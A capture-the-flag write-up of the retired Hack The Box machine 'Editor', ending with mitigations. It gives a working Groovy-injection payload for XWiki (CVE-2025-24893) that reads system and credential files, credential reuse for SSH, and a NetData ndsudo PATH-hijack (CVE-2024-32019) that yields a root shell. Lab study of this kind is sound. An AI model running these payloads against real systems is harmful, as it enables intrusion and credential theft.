---
machine: Editor
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, xwiki, cve-2025-24893, velocity, netdata, cve-2024-32019]
---

# Editor — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

XWiki 15.10.8 is vulnerable to CVE-2025-24893, a Velocity/Groovy injection in `SolrSearch` that reads files. The Hibernate password is reused for `oliver`; the `netdata` group and the SUID `ndsudo` helper allow a PATH hijack for root.

## Reconnaissance

```bash
nmap -Pn -sC -sV -p22,80,8080 <IP>
```

- SSH, nginx and Jetty.
- `editor.htb` serves a React landing page.
- XWiki 15.10.8 responds on port 8080.

## Enumeration

- The landing page links to the XWiki backend.
- `/xwiki/bin/view/Main/` and `Main.SolrSearch` are guest-accessible.
- The version falls within the CVE-2025-24893 range.

## Foothold

The `text` parameter is interpolated into a Velocity template. `/get/Main/SolrSearch` with `media=rss` avoids normal rendering and executes Groovy.

```bash
curl -sL --get \
  --data-urlencode 'text=}}}{{async async=false}}{{groovy}}println(new File("/etc/passwd").text){{/groovy}}{{/async}}' \
  --data-urlencode 'media=rss' \
  'http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch'
```

The same primitive reads `/etc/xwiki/hibernate.cfg.xml` and exposes the database password. It is sprayed against system users; `oliver` reuses it and allows SSH.

```bash
ssh oliver@editor.htb
id
```

## Privilege escalation

`oliver` belongs to the `netdata` group. `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo` is SUID root and resolves binary names through `PATH` (CVE-2024-32019).

```bash
find / -perm -4000 -type f 2>/dev/null
strings /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo | grep -E '^[a-z][a-z-]*$'
```

An executable named `nvme` is placed in a controlled directory and `ndsudo nvme-list` is invoked with that `PATH`. The helper runs the binary as root; an ELF calling `setuid(0)` creates a SUID shell.

```bash
PATH=/tmp/p:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
/tmp/rootbash -p
```

## Evidence

- `/etc/passwd` and `hibernate.cfg.xml` reads.
- SSH access as `oliver`.
- `ndsudo` permissions and `strings` output.
- SUID binary and redacted flag.

## Lessons learned

- A template injection can be file-read only and still chain the rest of the box.
- Application credentials may be reused for system accounts.
- A SUID helper resolving binaries by name is a PATH-hijack target.

## Mitigations and detection

- Update XWiki to 15.10.11, 16.4.1 or later.
- Do not reuse database passwords for human accounts.
- Update NetData and review SUID helpers; use absolute paths.
- Audit `ndsudo` executions and `PATH` changes in privileged processes.

## References

- <https://www.hackthebox.com/machines/Editor>
- <https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-rr6p-3pfg-562j>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-24893>
- <https://nvd.nist.gov/vuln/detail/CVE-2024-32019>
